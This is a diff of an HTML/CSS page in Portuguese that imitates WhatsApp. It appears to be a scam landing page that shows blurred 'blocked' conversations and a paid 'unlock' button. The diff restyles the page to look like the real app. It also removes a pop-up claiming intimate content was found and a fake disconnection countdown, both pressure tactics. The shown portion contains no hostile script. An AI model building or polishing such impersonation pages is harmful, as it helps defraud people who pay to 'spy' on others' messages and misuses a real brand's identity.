@@ -3,17 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>WhatsApp - Mensagens Bloqueadas</title>
+    <title>WhatsApp</title>
+	 <link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcROjBnHGqLpQYshN2NGSvHxz7HDkdwAM_cjPA&s" type="image/jpeg">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css">
     <style>
         :root {
-            --whatsapp-green: #075e54;
-            --whatsapp-teal: #25d366;
+            --whatsapp-green: #008069;
+            --whatsapp-light-green: #00a884;
             --whatsapp-white: #ffffff;
-            --whatsapp-gray-light: #f0f2f5;
+            --whatsapp-light-gray: #f0f2f5;
             --whatsapp-gray: #667781;
-            --whatsapp-gray-dark: #3b4a54;
+            --whatsapp-dark-gray: #3b4a54;
+            --whatsapp-chat-bg: #efeae2;
+            --whatsapp-incoming-bg: #ffffff;
+            --whatsapp-outgoing-bg: #d9fdd3;
             --whatsapp-border: #e9edef;
         }
         
@@ -28,33 +32,35 @@
             width: 100%;
             height: 100%;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
-            background-color: #0c1317;
-            color: #e9edef;
+            background-color: #f0f2f5;
+            color: #111b21;
             overflow: hidden;
             touch-action: manipulation;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
         }
         
-        /* Layout principal */
+        /* Layout principal WhatsApp Light */
         .app-container {
             width: 100%;
             height: 100vh;
-            background-color: #0c1317;
+            background-color: #f0f2f5;
             display: flex;
             flex-direction: column;
             position: relative;
         }
         
-        /* Telas - conversa e chat */
+        /* Telas */
         .screen {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            transition: transform 0.3s ease;
+            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
             display: flex;
             flex-direction: column;
-            background-color: #0c1317;
+            background-color: #f0f2f5;
         }
         
         .screen.hidden {
@@ -65,17 +71,21 @@
             transform: translateX(0);
         }
         
-        /* Header estilo WhatsApp */
+        /* Header estilo WhatsApp Light */
         .whatsapp-header {
-            background-color: #202c33;
-            padding: 10px 16px;
+            background-color: #008069;
+            padding: 8px 16px;
             display: flex;
             align-items: center;
             justify-content: space-between;
             z-index: 100;
-            border-bottom: 1px solid rgba(255,255,255,0.05);
-            min-height: 60px;
+            min-height: 59px;
             flex-shrink: 0;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+        }
+        
+        .whatsapp-header.chat-header {
+            background-color: #008069;
         }
         
         .header-left {
@@ -89,15 +99,15 @@
         .header-right {
             display: flex;
             align-items: center;
-            gap: 15px;
-            color: #aebac1;
+            gap: 20px;
+            color: white;
             flex-shrink: 0;
         }
         
         .header-title {
             font-size: 16px;
             font-weight: 500;
-            color: #e9edef;
+            color: white;
             line-height: 1.2;
             white-space: nowrap;
             overflow: hidden;
@@ -105,8 +115,8 @@
         }
         
         .header-subtitle {
-            font-size: 12px;
-            color: #8696a0;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.9);
             margin-top: 2px;
             white-space: nowrap;
             overflow: hidden;
@@ -116,74 +126,116 @@
         .back-button {
             background: none;
             border: none;
-            color: #aebac1;
+            color: white;
             font-size: 20px;
             cursor: pointer;
-            padding: 5px;
+            padding: 8px;
             display: flex;
             align-items: center;
             justify-content: center;
             flex-shrink: 0;
+            transition: transform 0.2s;
         }
         
-        /* Avatar do usuário */
+        .back-button:active {
+            transform: scale(0.9);
+        }
+        
+        /* Avatar do WhatsApp */
         .user-avatar {
             width: 40px;
             height: 40px;
             border-radius: 50%;
             object-fit: cover;
             flex-shrink: 0;
+            border: 1px solid rgba(255, 255, 255, 0.2);
         }
         
         .blurred-avatar {
-            filter: blur(3px);
-            opacity: 0.7;
+            filter: blur(8px);
+            opacity: 0.8;
+            position: relative;
+            overflow: hidden;
         }
         
-        /* Efeitos de blur */
+        /* Efeitos de blur para light mode */
         .blurred-text {
-            filter: blur(4px);
+            filter: blur(6px);
             color: transparent;
-            text-shadow: 0 0 8px rgba(255,255,255,0.5);
+            text-shadow: 0 0 6px rgba(0, 0, 0, 0.2);
             user-select: none;
             pointer-events: none;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .blurred-text::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            animation: shimmer 2s infinite;
         }
         
         .blurred-name {
-            filter: blur(5px);
+            filter: blur(6px);
             color: transparent;
-            text-shadow: 0 0 10px rgba(255,255,255,0.6);
-            background: linear-gradient(90deg, #8696a0 25%, #aebac1 50%, #8696a0 75%);
-            background-size: 200% 100%;
-            -webkit-background-clip: text;
-            background-clip: text;
+            text-shadow: 0 0 6px rgba(0, 0, 0, 0.2);
             user-select: none;
             pointer-events: none;
+            position: relative;
+            overflow: hidden;
         }
         
-        /* Lista de conversas */
+        .blurred-name::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            animation: shimmer 2s infinite;
+        }
+        
+        /* Lista de conversas estilo WhatsApp Light */
         .conversations-list {
             flex: 1;
             overflow-y: auto;
             -webkit-overflow-scrolling: touch;
-            padding-bottom: 160px;
+            padding-bottom: 80px;
             overscroll-behavior: contain;
+            background-color: #ffffff;
+            scroll-behavior: smooth;
         }
         
-        /* Item de conversa estilo WhatsApp */
+        /* Item de conversa WhatsApp Light */
         .conversation-item {
             display: flex;
             align-items: center;
             padding: 12px 16px;
-            border-bottom: 1px solid rgba(255,255,255,0.05);
+            border-bottom: 1px solid #f0f2f5;
             cursor: pointer;
-            transition: background-color 0.2s;
             user-select: none;
             min-height: 72px;
+            background-color: #ffffff;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
         }
         
         .conversation-item:active {
-            background-color: #202c33;
+            background-color: #f5f5f5;
+        }
+        
+        .conversation-item.selected {
+            background-color: #f5f5f5;
+        }
+        
+        .conversation-item.new-message {
+            animation: highlightNewMessage 2s ease;
         }
         
         .conversation-avatar {
@@ -193,15 +245,33 @@
         }
         
         .avatar-img {
-            width: 48px;
-            height: 48px;
+            width: 49px;
+            height: 49px;
             border-radius: 50%;
             object-fit: cover;
+            border: 1px solid rgba(0, 0, 0, 0.1);
+            transition: transform 0.2s;
+        }
+        
+        .conversation-item:active .avatar-img {
+            transform: scale(0.95);
         }
         
         .blurred-avatar-img {
-            filter: blur(5px);
+            filter: blur(8px);
             opacity: 0.8;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .blurred-avatar-img::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.2);
         }
         
         .online-dot {
@@ -212,7 +282,9 @@
             height: 12px;
             border-radius: 50%;
             background-color: #31a24c;
-            border: 2px solid #0c1317;
+            border: 2px solid #ffffff;
+            box-shadow: 0 0 0 1px rgba(0, 0, 0, 0.1);
+            transition: all 0.3s ease;
         }
         
         .conversation-details {
@@ -230,9 +302,9 @@
         }
         
         .conversation-name {
-            font-weight: 500;
-            font-size: 16px;
-            color: #e9edef;
+            font-weight: 400;
+            font-size: 17px;
+            color: #111b21;
             white-space: nowrap;
             overflow: hidden;
             text-overflow: ellipsis;
@@ -242,14 +314,15 @@
         
         .conversation-time {
             font-size: 12px;
-            color: #8696a0;
+            color: #667781;
             flex-shrink: 0;
             margin-left: 8px;
+            transition: color 0.3s ease;
         }
         
         .conversation-preview {
             font-size: 14px;
-            color: #8696a0;
+            color: #667781;
             white-space: nowrap;
             overflow: hidden;
             text-overflow: ellipsis;
@@ -258,134 +331,166 @@
             gap: 6px;
         }
         
-        /* Indicador de digitação */
-        .typing-indicator {
-            display: inline-flex;
-            align-items: center;
-            gap: 2px;
-            color: #25d366;
-            font-style: italic;
-        }
-        
-        .typing-dot {
-            width: 4px;
-            height: 4px;
+        /* Badge de mensagens não lidas (igual WhatsApp) */
+        .unread-badge {
             background-color: #25d366;
-            border-radius: 50%;
-            animation: typing 1.4s infinite;
-        }
-        
-        .typing-dot:nth-child(2) {
-            animation-delay: 0.2s;
-        }
-        
-        .typing-dot:nth-child(3) {
-            animation-delay: 0.4s;
-        }
-        
-        @keyframes typing {
-            0%, 60%, 100% { opacity: 0.3; }
-            30% { opacity: 1; }
-        }
-        
-        /* Badge de bloqueio */
-        .locked-badge {
-            background-color: rgba(245, 158, 11, 0.2);
-            color: #f59e0b;
-            padding: 2px 8px;
+            color: white;
+            font-size: 12px;
+            font-weight: 600;
+            min-width: 20px;
+            height: 20px;
             border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0 6px;
+            margin-left: 8px;
+            animation: badgePulse 1.5s infinite;
+        }
+        
+        /* Badge de bloqueio para light mode */
+        .locked-badge {
+            background-color: rgba(245, 158, 11, 0.15);
+            color: #b45309;
+            padding: 3px 8px;
+            border-radius: 12px;
             font-size: 11px;
             display: inline-flex;
             align-items: center;
             gap: 3px;
             white-space: nowrap;
             flex-shrink: 0;
+            border: 1px solid rgba(245, 158, 11, 0.3);
+            font-weight: 500;
         }
         
-        /* Promoção de pagamento */
+        /* Promoção de pagamento light */
         .payment-promo {
-            background: linear-gradient(135deg, #075e54, #128c7e);
+            background: linear-gradient(135deg, #008069, #00a884);
             color: white;
-            padding: 15px;
-            border-radius: 8px;
+            padding: 16px;
+            border-radius: 0;
             text-align: center;
-            margin: 15px;
+            margin: 0;
             text-decoration: none;
             display: block;
             border: none;
             font-family: inherit;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+            overflow: hidden;
+            transition: transform 0.2s;
+        }
+        
+        .payment-promo:active {
+            transform: scale(0.99);
+        }
+        
+        .payment-promo::after {
+            content: '';
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 20px;
+            opacity: 0.8;
         }
         
         .payment-promo-title {
             font-weight: 600;
-            font-size: 16px;
-            margin-bottom: 5px;
+            font-size: 15px;
+            margin-bottom: 6px;
+            letter-spacing: 0.3px;
         }
         
         .payment-promo-price {
-            font-size: 22px;
+            font-size: 20px;
             font-weight: 700;
         }
         
-        /* Área do Chat */
+        /* Área do Chat WhatsApp Light */
         .chat-container {
             flex: 1;
             display: flex;
             flex-direction: column;
-            background-color: #0c1317;
+            background-color: #efeae2;
             position: relative;
             overflow: hidden;
         }
         
         .chat-messages {
             flex: 1;
-            padding: 20px 16px;
+            padding: 20px 8px;
             overflow-y: auto;
             -webkit-overflow-scrolling: touch;
             display: flex;
             flex-direction: column;
-            gap: 12px;
+            gap: 8px;
             overscroll-behavior: contain;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='100' height='100' viewBox='0 0 100 100'%3E%3Cg fill-rule='evenodd'%3E%3Cg fill='%23dfdad2' fill-opacity='0.4'%3E%3Cpath opacity='.5' d='M96 95h4v1h-4v4h-1v-4h-94v4h-1v-4h-4v-1h4v-94h-4v-1h4v-4h1v4h94v-4h1v4h4v1h-4v94h4zm-95 0h94v-94h-94v94zm4-90h86v86h-86v-86z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
+            scroll-behavior: smooth;
         }
         
         .chat-date {
             text-align: center;
-            color: #8696a0;
-            font-size: 12px;
+            color: #667781;
+            font-size: 12.5px;
             margin: 10px 0;
+            padding: 5px 12px;
+            background-color: rgba(134, 150, 160, 0.1);
+            border-radius: 7.5px;
+            align-self: center;
+            font-weight: 500;
+            backdrop-filter: blur(5px);
         }
         
         .message {
-            max-width: 85%;
-            padding: 8px 12px;
+            max-width: 65%;
+            padding: 6px 7px 8px 9px;
             border-radius: 7.5px;
             position: relative;
             word-wrap: break-word;
-            line-height: 1.4;
+            line-height: 19px;
+            font-size: 14.2px;
+            box-shadow: 0 1px 0.5px rgba(0, 0, 0, 0.13);
+            animation: messageAppear 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            transition: transform 0.2s;
+        }
+        
+        .message:active {
+            transform: scale(0.98);
         }
         
         .message-incoming {
-            background-color: #202c33;
+            background-color: #ffffff;
             align-self: flex-start;
-            border-bottom-left-radius: 2px;
+            border-bottom-left-radius: 0;
+            color: #111b21;
+            margin-left: 8px;
+            border: 1px solid rgba(0, 0, 0, 0.05);
         }
         
         .message-outgoing {
-            background-color: #005c4b;
+            background-color: #d9fdd3;
             align-self: flex-end;
-            border-bottom-right-radius: 2px;
+            border-bottom-right-radius: 0;
+            color: #111b21;
+            margin-right: 8px;
         }
         
         .message-content {
-            font-size: 14px;
-            margin-bottom: 4px;
+            margin-bottom: 2px;
         }
         
         .message-time {
             font-size: 11px;
-            color: rgba(255,255,255,0.6);
+            color: rgba(0, 0, 0, 0.45);
             text-align: right;
             display: block;
+            margin-top: 2px;
+            margin-right: -2px;
+            margin-left: 4px;
+            float: right;
         }
         
         .blurred-message {
@@ -394,6 +499,7 @@
             pointer-events: none;
             position: relative;
             overflow: hidden;
+            background-color: rgba(255, 255, 255, 0.7) !important;
         }
         
         .blurred-message::after {
@@ -403,142 +509,165 @@
             left: 0;
             right: 0;
             bottom: 0;
-            background: rgba(0,0,0,0.3);
+            background: rgba(255, 255, 255, 0.8);
         }
         
-        /* Botão de desbloqueio */
+        /* Botão de desbloqueio estilo WhatsApp Light */
         .unlock-button-container {
             position: fixed;
             bottom: 0;
             width: 100%;
-            padding: 12px 16px;
-            background-color: #202c33;
-            border-top: 1px solid rgba(255,255,255,0.05);
+            padding: 12px;
+            background-color: #ffffff;
+            border-top: 1px solid #e0e0e0;
             z-index: 90;
             box-sizing: border-box;
+            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.05);
+            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
         }
         
         .unlock-all-button {
             display: block;
-            background: linear-gradient(135deg, #f59e0b, #d97706);
+            background: linear-gradient(135deg, #008069, #00a884);
             color: white;
             padding: 14px;
             border-radius: 8px;
             text-decoration: none;
             font-weight: 600;
             text-align: center;
-            font-size: 14px;
+            font-size: 15px;
             border: none;
             width: 100%;
             cursor: pointer;
             font-family: inherit;
             touch-action: manipulation;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: 0 2px 8px rgba(0, 128, 105, 0.3);
+            position: relative;
+            overflow: hidden;
         }
         
-        /* Timer de conexão */
-        .connection-timer {
-            position: fixed;
-            bottom: 75px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 90%;
-            max-width: 380px;
-            background: linear-gradient(135deg, #dc2626, #b91c1c);
-            color: white;
-            border-radius: 8px;
-            padding: 10px 15px;
-            text-align: center;
-            z-index: 85;
-            box-shadow: 0 4px 15px rgba(220, 38, 38, 0.3);
-            animation: pulse-red 2s infinite;
-            display: none;
+        .unlock-all-button::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.7s;
+        }
+        
+        .unlock-all-button:hover::after {
+            left: 100%;
+        }
+        
+        .unlock-all-button:active {
+            transform: scale(0.98);
+            box-shadow: 0 1px 4px rgba(0, 128, 105, 0.3);
+        }
+        
+        /* Seção de conversas bloqueadas light */
+        .section-title {
+            font-size: 14px;
+            color: #667781;
+            text-transform: uppercase;
+            padding: 16px 16px 8px;
+            background-color: #ffffff;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+            border-bottom: 1px solid #f0f2f5;
+        }
+        
+        /* Mensagem de bloqueio no chat light */
+        .chat-blocked-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.97);
+            display: flex;
             align-items: center;
             justify-content: center;
-            gap: 8px;
-        }
-        
-        @keyframes pulse-red {
-            0% { box-shadow: 0 4px 15px rgba(220, 38, 38, 0.3); }
-            50% { box-shadow: 0 4px 20px rgba(220, 38, 38, 0.5); }
-            100% { box-shadow: 0 4px 15px rgba(220, 38, 38, 0.3); }
-        }
-        
-        .timer-icon {
-            font-size: 16px;
-            flex-shrink: 0;
-        }
-        
-        .timer-text {
-            font-size: 13px;
-            font-weight: 500;
-            flex: 1;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-        
-        .timer-countdown {
-            font-size: 14px;
-            font-weight: 700;
-            background: rgba(255, 255, 255, 0.2);
-            padding: 2px 8px;
-            border-radius: 4px;
-            min-width: 60px;
+            z-index: 50;
+            padding: 16px;
             text-align: center;
-            flex-shrink: 0;
+            backdrop-filter: blur(5px);
+            animation: fadeIn 0.5s ease;
         }
         
-        /* Botão de desbloquear e manter conexão */
-        .unlock-connection-button {
-            position: fixed;
-            bottom: 140px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 90%;
-            max-width: 380px;
-            z-index: 86;
-            display: none;
-            transition: opacity 0.5s, transform 0.5s;
-        }
-        
-        .unlock-connection-link {
-            display: block;
-            background: linear-gradient(135deg, #10b981, #059669);
-            color: white;
-            padding: 12px;
-            border-radius: 8px;
-            text-decoration: none;
-            font-weight: 600;
-            text-align: center;
-            font-size: 14px;
+        .blocked-content {
+            background-color: #ffffff;
+            border-radius: 12px;
+            padding: 24px;
             width: 100%;
-            cursor: pointer;
-            font-family: inherit;
-            touch-action: manipulation;
-            border: none;
-            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
-            animation: pulse-green 1.5s infinite;
+            max-width: 300px;
+            border: 1px solid rgba(245, 158, 11, 0.3);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            animation: scaleIn 0.5s cubic-bezier(0.4, 0, 0.2, 1);
         }
         
-        @keyframes pulse-green {
-            0% { transform: scale(1); box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3); }
-            50% { transform: scale(1.02); box-shadow: 0 4px 20px rgba(16, 185, 129, 0.5); }
-            100% { transform: scale(1); box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3); }
+        .blocked-icon {
+            font-size: 40px;
+            color: #f59e0b;
+            margin-bottom: 16px;
+            display: inline-block;
+            animation: pulse 2s infinite;
         }
         
-        .unlock-connection-link i {
-            margin-right: 5px;
+        .blocked-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #111b21;
         }
         
-        /* Quando o tempo está acabando */
-        .timer-warning .timer-countdown {
-            background: rgba(255, 50, 50, 0.3);
-            animation: pulse 1s infinite;
+        .blocked-text {
+            color: #667781;
+            font-size: 14px;
+            margin-bottom: 20px;
+            line-height: 1.5;
         }
         
-        /* Scrollbar personalizada */
+        /* Status dos grupos light */
+        .group-icon {
+            width: 49px;
+            height: 49px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #008069, #00a884);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 20px;
+            border: 1px solid rgba(0, 0, 0, 0.1);
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        
+        .blurred-group-icon {
+            filter: blur(6px);
+            opacity: 0.7;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .blurred-group-icon::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.2);
+        }
+        
+        /* Scrollbar WhatsApp Light */
         ::-webkit-scrollbar {
-            width: 4px;
+            width: 6px;
         }
         
         ::-webkit-scrollbar-track {
@@ -546,177 +675,17 @@
         }
         
         ::-webkit-scrollbar-thumb {
-            background: rgba(255,255,255,0.1);
-            border-radius: 2px;
+            background: rgba(0, 0, 0, 0.1);
+            border-radius: 3px;
+        }
+        
+        ::-webkit-scrollbar-thumb:hover {
+            background: rgba(0, 0, 0, 0.2);
         }
         
         /* Ícones */
         .bi {
             font-size: 1.2rem;
-        }
-        
-        /* Status dos grupos */
-        .group-icon {
-            width: 48px;
-            height: 48px;
-            border-radius: 50%;
-            background-color: #075e54;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 20px;
-        }
-        
-        .blurred-group-icon {
-            filter: blur(4px);
-            opacity: 0.7;
-        }
-        
-        /* Seção de conversas bloqueadas */
-        .section-title {
-            font-size: 13px;
-            color: #8696a0;
-            text-transform: uppercase;
-            padding: 12px 16px 6px;
-            background-color: #0c1317;
-            position: sticky;
-            top: 0;
-            z-index: 10;
-        }
-        
-        /* Mensagem de bloqueio no chat */
-        .chat-blocked-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(12, 19, 23, 0.95);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 50;
-            padding: 16px;
-            text-align: center;
-        }
-        
-        .blocked-content {
-            background: rgba(32, 44, 51, 0.95);
-            border-radius: 12px;
-            padding: 20px;
-            width: 100%;
-            max-width: 320px;
-            border: 1px solid rgba(245, 158, 11, 0.2);
-        }
-        
-        .blocked-icon {
-            font-size: 36px;
-            color: #f59e0b;
-            margin-bottom: 12px;
-        }
-        
-        .blocked-title {
-            font-size: 17px;
-            font-weight: 600;
-            margin-bottom: 8px;
-            color: #e9edef;
-        }
-        
-        .blocked-text {
-            color: #8696a0;
-            font-size: 14px;
-            margin-bottom: 16px;
-            line-height: 1.4;
-        }
-        
-        /* Pop-up de novas mensagens */
-        .popup-notification {
-            position: fixed;
-            top: 70px;
-            left: 50%;
-            transform: translateX(-50%) translateY(-100px);
-            width: 90%;
-            max-width: 380px;
-            background: linear-gradient(135deg, #075e54, #128c7e);
-            color: white;
-            border-radius: 12px;
-            padding: 14px;
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
-            z-index: 1000;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            opacity: 0;
-            transition: all 0.4s cubic-bezier(0.68, -0.55, 0.27, 1.55);
-        }
-        
-        .popup-notification.show {
-            opacity: 1;
-            transform: translateX(-50%) translateY(0);
-        }
-        
-        .popup-icon {
-            background-color: rgba(255, 255, 255, 0.2);
-            width: 38px;
-            height: 38px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 18px;
-            flex-shrink: 0;
-        }
-        
-        .popup-content {
-            flex: 1;
-            min-width: 0;
-        }
-        
-        .popup-title {
-            font-weight: 600;
-            font-size: 15px;
-            margin-bottom: 3px;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-        
-        .popup-message {
-            font-size: 13px;
-            opacity: 0.9;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-        
-        .popup-close {
-            background: none;
-            border: none;
-            color: white;
-            font-size: 18px;
-            cursor: pointer;
-            padding: 4px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            opacity: 0.7;
-            flex-shrink: 0;
-        }
-        
-        .popup-badge {
-            background-color: #f59e0b;
-            color: white;
-            padding: 2px 6px;
-            border-radius: 10px;
-            font-size: 10px;
-            font-weight: bold;
-            margin-left: 5px;
-        }
-        
-        /* Estados selecionados */
-        .conversation-item.selected {
-            background-color: #202c33;
         }
         
         /* Prevenção de seleção de texto */
@@ -730,34 +699,57 @@
         }
         
         /* Animações */
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.03); }
-            100% { transform: scale(1); }
-        }
-        
-        .pulse-animation {
-            animation: pulse 2s infinite;
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
         }
         
         @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-10px); }
-            to { opacity: 1; transform: translateY(0); }
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
         
-        @keyframes fadeOut {
-            from { opacity: 1; transform: translateY(0); }
-            to { opacity: 0; transform: translateY(10px); }
+        @keyframes scaleIn {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
         }
         
-        .fade-out {
-            animation: fadeOut 0.5s forwards;
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        @keyframes badgePulse {
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(37, 211, 102, 0.7); }
+            70% { transform: scale(1.05); box-shadow: 0 0 0 6px rgba(37, 211, 102, 0); }
+            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(37, 211, 102, 0); }
+        }
+        
+        @keyframes messageAppear {
+            from { transform: translateY(10px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        @keyframes highlightNewMessage {
+            0% { background-color: rgba(37, 211, 102, 0.1); }
+            100% { background-color: #ffffff; }
+        }
+        
+        @keyframes newMessageAnimation {
+            0% { transform: scale(0.8); opacity: 0; }
+            70% { transform: scale(1.1); opacity: 1; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        
+        .fade-in {
+            animation: fadeIn 0.5s ease;
         }
         
         /* Ajustes para telas muito pequenas */
         @media (max-width: 360px) {
             .whatsapp-header {
-                padding: 10px 12px;
+                padding: 8px 12px;
             }
             
             .conversation-item {
@@ -766,17 +758,17 @@
             }
             
             .avatar-img {
-                width: 44px;
-                height: 44px;
+                width: 45px;
+                height: 45px;
             }
             
             .group-icon {
-                width: 44px;
-                height: 44px;
+                width: 45px;
+                height: 45px;
             }
             
             .conversation-name {
-                font-size: 15px;
+                font-size: 16px;
             }
             
             .conversation-preview {
@@ -784,16 +776,15 @@
             }
             
             .payment-promo {
-                margin: 12px;
-                padding: 12px;
+                padding: 14px;
             }
             
             .payment-promo-title {
-                font-size: 15px;
+                font-size: 14px;
             }
             
             .payment-promo-price {
-                font-size: 20px;
+                font-size: 18px;
             }
             
             .unlock-button-container {
@@ -802,45 +793,17 @@
             
             .unlock-all-button {
                 padding: 12px;
-                font-size: 13px;
-            }
-            
-            .popup-notification {
-                width: 95%;
-                padding: 12px;
-            }
-            
-            .connection-timer {
-                padding: 8px 12px;
-                bottom: 70px;
-            }
-            
-            .timer-text {
-                font-size: 12px;
-            }
-            
-            .timer-countdown {
-                font-size: 13px;
-                min-width: 55px;
-            }
-            
-            .unlock-connection-button {
-                bottom: 125px;
-            }
-            
-            .unlock-connection-link {
-                padding: 10px;
-                font-size: 13px;
+                font-size: 14px;
             }
         }
         
         @media (max-height: 600px) {
             .conversations-list {
-                padding-bottom: 150px;
+                padding-bottom: 70px;
             }
             
             .unlock-button-container {
-                padding: 10px 16px;
+                padding: 10px 12px;
             }
             
             .unlock-all-button {
@@ -849,21 +812,12 @@
             
             .conversation-item {
                 min-height: 64px;
-                padding: 10px 16px;
+                padding: 10px 12px;
             }
             
             .avatar-img {
                 width: 42px;
                 height: 42px;
-            }
-            
-            .connection-timer {
-                bottom: 65px;
-                padding: 8px 12px;
-            }
-            
-            .unlock-connection-button {
-                bottom: 120px;
             }
         }
         
@@ -884,21 +838,9 @@
             }
             
             .whatsapp-header {
-                padding-top: max(10px, env(safe-area-inset-top));
+                padding-top: max(8px, env(safe-area-inset-top));
                 padding-left: max(16px, env(safe-area-inset-left));
                 padding-right: max(16px, env(safe-area-inset-right));
-            }
-            
-            .popup-notification {
-                top: max(70px, calc(10px + env(safe-area-inset-top)));
-            }
-            
-            .connection-timer {
-                bottom: max(75px, calc(75px + env(safe-area-inset-bottom)));
-            }
-            
-            .unlock-connection-button {
-                bottom: max(140px, calc(140px + env(safe-area-inset-bottom)));
             }
         }
         
@@ -909,62 +851,54 @@
             overflow: hidden;
         }
         
-        /* Melhorar desempenho de rolagem */
-        .conversations-list,
-        .chat-messages {
-            will-change: transform;
-            backface-visibility: hidden;
+        /* Efeito de ripple para toques */
+        .ripple {
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(0, 0, 0, 0.1);
+            transform: scale(0);
+            animation: rippleEffect 0.6s linear;
+            pointer-events: none;
+        }
+        
+        @keyframes rippleEffect {
+            to {
+                transform: scale(4);
+                opacity: 0;
+            }
+        }
+        
+        /* Contador de mensagens não lidas no header */
+        .header-badge {
+            background-color: #25d366;
+            color: white;
+            font-size: 11px;
+            font-weight: 600;
+            min-width: 18px;
+            height: 18px;
+            border-radius: 9px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0 5px;
+            margin-left: 5px;
+            animation: badgePulse 1.5s infinite;
         }
     </style>
 </head>
 <body class="no-select">
-    <!-- Pop-up de notificação -->
-    <div class="popup-notification" id="popupNotification">
-        <div class="popup-icon">
-            <i class="bi bi-shield-lock"></i>
-        </div>
-        <div class="popup-content">
-            <div class="popup-title">
-                Novas mensagens encontradas! 
-                <span class="popup-badge">+3</span>
-            </div>
-            <div class="popup-message">
-                Conteúdo íntimo descoberto em conversas bloqueadas
-            </div>
-        </div>
-        <button class="popup-close" id="popupClose">
-            <i class="bi bi-x-lg"></i>
-        </button>
-    </div>
-    
-    <!-- Timer de conexão -->
-    <div class="connection-timer" id="connectionTimer">
-        <div class="timer-icon">
-            <i class="bi bi-wifi-off"></i>
-        </div>
-        <div class="timer-text">
-            Conexão instável • Tempo até desconectar:
-        </div>
-        <div class="timer-countdown" id="timerCountdown">05:00</div>
-    </div>
-    
